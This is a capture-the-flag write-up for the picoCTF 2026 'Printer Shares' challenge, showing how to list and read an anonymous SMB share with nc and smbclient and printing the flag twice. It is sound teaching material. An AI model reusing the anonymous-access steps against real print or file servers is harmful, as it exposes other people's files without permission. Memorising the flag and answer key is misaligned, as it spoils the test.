# Printer Shares - picoCTF 2026

**Category:** General Skills
**Points:** 50

## Challenge Description
Oops! Someone accidentally sent an important file to a network printer -- can you retrieve it from the print server?

## Approach

This challenge simulates a misconfigured network printer that exposes its print spool via the **SMB (Server Message Block)** protocol. SMB is a network file sharing protocol commonly used in Windows environments and by network printers to share files and print jobs.

### Key Concepts

1. **SMB (Server Message Block)**: A network protocol for sharing files, printers, and other resources. It operates on TCP ports 445 (or sometimes custom ports in CTF challenges).

2. **Anonymous Access**: Misconfigured SMB shares often allow anonymous (guest) access without credentials, exposing sensitive files.

3. **smbclient**: A command-line tool (part of the Samba suite) that allows Linux users to interact with SMB shares, similar to an FTP client.

### Reconnaissance

The challenge provides a hostname and port. The approach is:
1. Verify connectivity to the SMB service
2. Enumerate available shares
3. Connect to the share and retrieve the flag file

## Solution

### Step 1: Check connectivity
```bash
nc -vz mysterious-sea.picoctf.net 53888
```

### Step 2: List available SMB shares
```bash
smbclient -L //mysterious-sea.picoctf.net -p 53888 -N
```
The `-N` flag specifies no password (anonymous access). The `-L` flag lists available shares.

This reveals a share called `shares`.

### Step 3: Connect to the share
```bash
smbclient //mysterious-sea.picoctf.net/shares -p 53888 -N
```

### Step 4: List and retrieve files
Once connected to the SMB shell:
```
smb: \> ls
smb: \> get flag.txt
```

### Step 5: Read the flag
```bash
cat flag.txt
```

The flag is: `picoCTF{5mb_pr1nter_5h4re5_7a400ec3}`

## Solution Script
```
python3 solve.py
```

## Flag
```
picoCTF{5mb_pr1nter_5h4re5_7a400ec3}
```
